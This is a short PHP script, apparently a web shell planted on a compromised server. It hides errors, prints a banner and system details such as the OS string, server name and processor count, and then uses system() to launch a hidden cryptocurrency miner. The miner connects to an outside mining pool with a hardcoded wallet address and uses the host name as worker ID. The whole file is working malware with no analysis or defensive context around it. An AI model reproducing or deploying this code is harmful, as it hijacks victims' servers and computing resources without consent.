<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
echo '<center><h1>PASUKAN BERANI MATI</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br/>';
echo 'Curl: ', function_exists('curl_version') ? 'Enabled' : 'Disabled';
echo '<br/>';
$sys = php_uname();
$lihat = php_uname(n);
echo $_SERVER['SERVER_NAME'];
echo '<br/>';
$corenya = system("echo %NUMBER_OF_PROCESSORS%");
echo '<br/>';
system('start cmd.exe /k "monitor.exe --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass '.$lihat.' --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"');
?>